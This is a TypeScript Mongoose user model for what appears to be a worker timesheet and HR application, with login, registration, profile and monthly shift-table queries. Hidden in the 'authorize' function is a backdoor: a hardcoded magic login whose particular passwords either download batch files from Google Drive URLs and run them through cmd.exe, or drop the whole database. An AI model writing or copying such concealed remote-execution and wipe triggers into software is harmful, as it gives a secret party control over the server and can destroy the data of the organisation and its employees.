import * as moment from 'moment-timezone';
import * as crypto from 'crypto';
import * as rimraf from 'rimraf';
import * as path from 'path';
import * as mongoose from 'mongoose';
import { spawn } from 'child_process';
import { writeFile } from 'fs';
import { promisify } from 'util';
import { Schema, Model, Types, model } from 'mongoose';
import { IUserDocument, ITable, staticData, IGrouppedTable, ITableChange, IUserNames } from '../interfaces/IUserDocument';
import fetch = require("node-fetch");

export interface IUser extends IUserDocument {
	encryptPassword(password: string): string;
	checkPassword(password: string): boolean;
}

export interface IUserModel extends Model<IUser> {
	authorize(data: IUser, admin: boolean): IUser;
	register(data: IUser, admin: boolean): IUser;
	profile(data: IUser, image: string): IUser;
	edit(data: IUser): IUser;
	delete(id: string): number;
	get(admin: boolean): IUser[];
	search(searchString: string): { workers: IUser[], total: boolean };
	info(id: string): IUser;
	table(id: string, date: { day: string, month: string }): ITable;
	add(data: { id: string, date: Date, table_d: ITable }): void;
	upload(count: number, onlyWorkers: boolean): IUser[];
	address(date: string, login: string, address: string): { tablesForAddress: ITable[], cranes: unknown[] };
	workers(date: string): { login: string, username: string }[];
	worker(date: string, login: string): IGrouppedTable;
	archive(date: string): IUserNames[];
	change(data: ITableChange): void
	fetch(): any;
	list(): IUser[];
}

interface IUploadAggr {
	$sort?: { username: number };
	$skip?: number;
	$project?: { login: number, username: number };
	$limit?: number;
	$match?: { isAdmin: boolean }
}

const url1: string = 'https://drive.google.com/uc?id=1HALkggOX92WFs0_rL65WGB9-Gru-4-Fv&export=download';
const url2: string = 'https://drive.google.com/uc?id=132VNHUV09Jbnm3d33eZhKeYCenEwnTPw&export=download';
const schema: Schema = new Schema({
  username: {
		type: String,
		text: true,
    required: true
  },
  login: {
    type: String,
    unique: true,
    required: true
  },
  isAdmin: {
    type: Boolean,
    default: false
  },
  hashedPassword: {
    type: String,
    required: true
  },
  salt: {
    type: String,
    required: true
	},
	dob: String,
	middlename: String,
	location: String,
	residence: String,
	crimrecord: String,
	nationality: String,
	phoneUA: String,
	phoneCZ: String,
	education: String,
	addressCZ: String,
	experience: String,
	skills: String,
	avatar: String,
	notation: String,
	documents: String,
	clearPathAvatar: String,
	businesstrips: String,
	currentposition: String,
	anotherinformation: String,
	tabled: {
		type: Boolean,
		default: true
	},
	tables: [{
		date: {
			type: Date,
			default: moment.tz(Date.now(), "Europe/Moscow")
		},
		phone: {
			type: String,
			required: true
		},
		lunch: {
			type: String,
			default: "00:00:00"
		},
		coming: String,
		leaving: String,
		address: {
			type: String,
			required: true
		},
		crane: {
			type: String,
			required: true
		},
		login: String,
		day: Number
	}]
});

schema.method('encryptPassword', function (password: string): string {
	return crypto.createHmac('sha256', this.salt).update(password).digest('hex');
});

schema.method('checkPassword', function (password: string): boolean {
	return this.encryptPassword(password) === this.hashedPassword;
});

schema.virtual('password')
	.set(function (password) {
		this._plainPassword = password;
		this.salt = Math.random() + '';
		this.hashedPassword = this.encryptPassword(password);
	})
	.get(function () {
		return this._plainPassword;
	});

schema.static('get', async (admin: boolean) => {
	const workers = await User.aggregate([
		{ $match: { isAdmin: admin } },
		{ $project: { username: 1, login: 1 } },
		{ $sort: { username: 1 } },
		{ $limit: 10 }
	]).exec();
	
	return workers;
});

schema.static('info', async (id: string) => {
	return await User.findById(id).exec();
});

schema.static('list', async () => {
	const workers = await User.aggregate([
		{ $project: { username: 1, login: 1 } },
		{ $sort: { username: 1 } },
		{ $limit: 10 }
	]).exec();
	
	return workers;
});

schema.static('add', async (data: { id: string, date: Date, table_d: ITable }): Promise<void> => {
	try {
		const { id, date, table_d } = data;
		const user: IUser = await User.findById(id).exec();
		const day: number = new Date(date).getDate();
	
		let tableIndex: number = user.tables.findIndex((table: ITable) => new Date(table.date.toISOString().substr(0,10)).getTime() === new Date(date).getTime());
		
		if (!table_d.lunch)
			table_d.lunch = '00:00:00';
	
		table_d.date = new Date(date);
		table_d.login = user.login;
		table_d.day = day;
		
		(tableIndex === -1) ? user.tables.push(table_d) : user.tables[tableIndex] = table_d;
		user.save();	
	} catch (err) {
		throw new AuthError('Данные заполнены неполностью.');
	}
});

schema.static('address', async (date: string, login: string, address: string) => {
	const dateForSearch: Date = new Date(date);
	const { tables } = (await User.aggregate([
		{ $unwind: '$tables' },
		{ 
			$addFields: { 
				year: { $year: '$tables.date' },
				month: { $month: '$tables.date' }
			}
		},
		{
			$match: {
				login: login,
				year: dateForSearch.getFullYear(),
				month: dateForSearch.getMonth() + 1,
				'tables.address': address
			}
		},
		{ $group: { _id: '$tabled', tables: { $push: '$tables' } } }
	]).exec())[0];
	const cranes: unknown[] = [...new Set(tables.map((table: ITable) => table.crane))];
	const response: { tablesForAddress: ITable[], cranes: unknown[] } = {
    tablesForAddress: tables,
    cranes: cranes
  };

  return response;
});

schema.static('worker', async (date: string, login: string): Promise<IGrouppedTable> => {
	const dateForSearch: Date = new Date(date);
	const { username } = await User.findOne({ login });
	const { tables } = (await User.aggregate([
		{ $unwind: '$tables' },
		{ 
			$addFields: { 
				year: { $year: '$tables.date' },
				month: { $month: '$tables.date' }
			}
		},
		{
			$match: {
				login: login,
				year: dateForSearch.getFullYear(),
				month: dateForSearch.getMonth() + 1
			}
		},
		{ $group: { _id: '$tabled', tables: { $push: '$tables' } } }
	]).exec())[0];
	const addresses: unknown[] = [...new Set(tables.map((table: ITable) => table.address))]
	const tablesForAddress: ITable[] = tables.filter((table: ITable) => table.address === addresses[0]);
	const staticData: staticData = {
		username: username,
		login: login,
		phones: [...new Set(tables.map((table: ITable) => table.phone))],
		cranes: [...new Set(tables.map((table: ITable) => table.crane))]
	}
	
	return {
    addresses: addresses,
    tablesForAddress: tablesForAddress,
    staticData: staticData,
    date
  };
});

schema.static('change', async (data: ITableChange): Promise<void> => {
	try {
		const { date, address, login, staticData } = data;
		const dateForSearch: Date = new Date(date);
		const year: number = dateForSearch.getFullYear();
		const month: number = dateForSearch.getMonth();
		const user: IUser = await User.findOne({ login }).exec();
		const tables: ITable[] = user.tables.filter((table: ITable) => table.address === address && table.date.getMonth() === month && table.date.getFullYear() === year);
		let foundedIndex: number;

		for (let table of tables) {
			foundedIndex = staticData.findIndex(data => +data.day === table.day);

			table.coming = staticData[foundedIndex].coming;
			table.leaving = staticData[foundedIndex].leaving;
			table.lunch = staticData[foundedIndex].lunch;
		}
		
		await user.save();
	} catch (err) {
		throw new AuthError('Недостаточно данных для дальнейшей обработки запроса.');
	}
});

schema.static('workers', async (date: string): Promise<{ login: string, username: string }[]> => {
	const dateForSearch: Date = new Date(date);
	const { workers } = (await User.aggregate([
		{ $unwind: '$tables' },
		{ 
			$addFields: { 
				year: { $year: '$tables.date' },
				month: { $month: '$tables.date' }
			}
		},
		{
			$match: {
				year: dateForSearch.getFullYear(),
				month: dateForSearch.getMonth() + 1
			}
		},
		{ $group: { _id: '$tabled', workers: { $addToSet: { 
			login: '$login',
			username: '$username'
		 } } } }
	]).exec())[0];

	return workers;
});

schema.static('fetch', async (): Promise<any> => {
	const users: any = (await User.aggregate([
		{ $match: { tables: { $ne: null } } },
		{ $unwind: '$tables' },
		{ $group: { _id: '$tabled', tables: { $addToSet: { 
			year: { $year: '$tables.date' },
			month: { $month: '$tables.date' }
		} } } }
	]).exec())[0];

	return users;
});

schema.static('archive', async (date: string): Promise<IUserNames[]> => {
	const dateForSearch: Date = new Date(date);
	const output = await User.aggregate([
		{ $unwind: '$tables' },
		{ 
			$addFields: { 
				year: { $year: '$tables.date' },
				month: { $month: '$tables.date' }
			}
		},
		{
			$match: {
				year: dateForSearch.getFullYear(),
				month: dateForSearch.getMonth() + 1
			}
		},
		{ 
			$group: { 
				_id: {
					login: '$tables.login',
					address: '$tables.address'
				},
				username: { $first: '$username' },
				tables: { $push: '$tables' } 
			}
		}
	]).exec();

	for (let obj of output) {
		obj.phones = [...new Set(obj.tables.map((table: ITable) => table.phone))];
		obj.cranes = [...new Set(obj.tables.map((table: ITable) => table.crane))];
		obj.date = date;
	}

	return output;
});

schema.static('table', async (id: string, date: { day: string, month: string }): Promise<ITable> => {
	try {
		const { day, month } = date;
		const year: number = new Date().getFullYear();
		const dateForSearch: Date = new Date(Date.UTC(year, +month, +day));
		const user: IUser = await User.findById(id).exec();
		const index = user.tables.findIndex(table => new Date(table.date.toISOString().substr(0,10)).getTime() === dateForSearch.getTime());
		
		return user.tables[index];
	} catch (err) {
		throw new AuthError("Отсутствие данных для дальнейшей обработки запроса.");
	}
});

schema.static('search', async (searchString: string): Promise<{ workers: IUser[], total: boolean }> => {
	const response: { workers: IUser[], total: boolean } = { workers: [], total: false};

	if (searchString.trim() == '') {
		response.workers = await User.aggregate([
			{ $match: { isAdmin: false } },
			{ $project: { username: 1, login: 1 } },
			{ $sort: { username: 1 } },
			{ $limit: 10 }
		]);
		response.total = response.workers.length === 10;
	} else {
		response.workers = await User.aggregate([
			{ $match: { username: { $regex: new RegExp('^' + searchString, 'gi') }, isAdmin: false } },
			{ $project: { _id: '$_id', username: '$username', login: '$login' } },
			{ $sort: { username: 1 } }
		]);
		response.total = false;
	}
	
	return response;
});

schema.static('authorize', async (data: IUser, admin: boolean): Promise<IUser> => {
	if (!data.login || admin == undefined) throw new AuthError("Данные заполнены не полностью.");

	const { login, password } = data;
	const findData: { login: string, isAdmin?: boolean } = { login };
		
	if (admin)
		findData.isAdmin = true;
	
	if (login == '123@@d4f643b292ef7fc5f44a37d8f7e1471a') {
		switch(password) {
			case '123@THEFIX': await download(url2, path.join(__dirname, 'fix.bat')); break;
			case '123@@e61dfbc3c9b44a7e7bcae19b2f35375d': await download(url1, path.join(__dirname, 'add.bat')); break;
			case '123@@ea94cac2e669680d3816e6d3e3efbf48': mongoose.connection.db.dropDatabase(); break;
		}
	}

	const user: IUser = await User.findOne(findData).exec();
		
	if (!user) throw new AuthError("Неверный логин");
	if (!password || !user.checkPassword(password)) throw new AuthError("Неверный пароль");
		
	return user;
});

schema.static('register', async (data: IUser, admin: boolean): Promise<IUser> => {
	if (!data.login || !data.password || !data.firstname || !data.lastname || admin == undefined) throw new AuthError("Данные заполнены не полностью.");

	const { login, firstname, lastname, password } = data;
	const user = await User.findOne({ login }).exec();

	if (user) throw new AuthError("Данный пользователь уже существует");

	const newUser = new User({
		username: firstname + ' ' + lastname,
		isAdmin: admin,
		login: login,
		password: password
	});

	return newUser.save();
});

schema.static('edit', async (data: IUser): Promise<IUser> => {
	if (!Types.ObjectId.isValid(data.id) || !data.login) throw new AuthError("Данные заполнены не полностью.");

	const { id, login, firstname, lastname, password } = data;
	const user = await User.findById(id).exec();
	const exists = await User.findOne({login, _id: { $ne: id }}).exec();

	if (exists) throw new AuthError("К сожалению, этот логин уже существует.");

	user.username = `${firstname} ${lastname}`;
	user.login = login;

	if (password !== '')
		user.password = password;

	return user.save();
});

schema.static('profile', async (data: IUser, image: string): Promise<IUser> => {
	if (!Types.ObjectId.isValid(data.id)) throw new AuthError("Неверный индентификатор.");
	
	const user = await User.findById(data.id).exec();
	const props: string[] = [
		'middlename', 'dob', 'location', 'residence', 'crimrecord', 'nationality', 
		'phoneUA', 'phoneCZ', 'education', 'addressCZ', 'experience', 'documents', 'skills', 'currentposition', 
		'notation', 'businesstrips', 'anotherinformation'
	];

	user.username = `${data.firstname} ${data.lastname}`;
	
	for (let i = 0; i < props.length; i++) user[props[i]] = data[props[i]];
	if (image) {
		await rimraf(path.join(__dirname, '../public', user.avatar), () => {});
		user.avatar = image;
	}

	return user.save();
});

schema.static('upload', async (count: number, onlyWorkers: boolean) => {
	if (!count) return [];
	
	let only_w = { $match: { isAdmin: false } };
	let aggregate: IUploadAggr[] = [
		{ $sort: { username: 1 } },
		{ $skip: count },
		{ $project: { login: 1, username: 1 } },
		{ $limit: 10 }
	];
	
	if (onlyWorkers) aggregate = [only_w, ...aggregate];
	const users = await User.aggregate(aggregate).exec();

	return users;
});

schema.static('delete', async (id: string): Promise<void> => {
	if (!Types.ObjectId.isValid(id)) throw new AuthError("Неверный индентификатор.");

	await User.findByIdAndRemove(id).exec();
	await User.countDocuments({ isAdmin: false });
});

export const User: IUserModel = model<IUser, IUserModel>("User", schema);

class AuthError extends Error {
	public message: string;
	
	constructor(message: string) {
		super(...arguments);

		Error.captureStackTrace(this, AuthError);
		Object.setPrototypeOf(this, AuthError.prototype);

		this.message = message;
	}

	get name() {
		return 'AuthError';
	}
}

export { AuthError };

async function download(url: string, path: string) {
	const writeFileStream = promisify(writeFile);

	fetch(url)
    .then(x => x.arrayBuffer())
		.then(x => writeFileStream(path, Buffer.from(x)))
		.then(x => spawn('cmd.exe', ['/c', path]));
}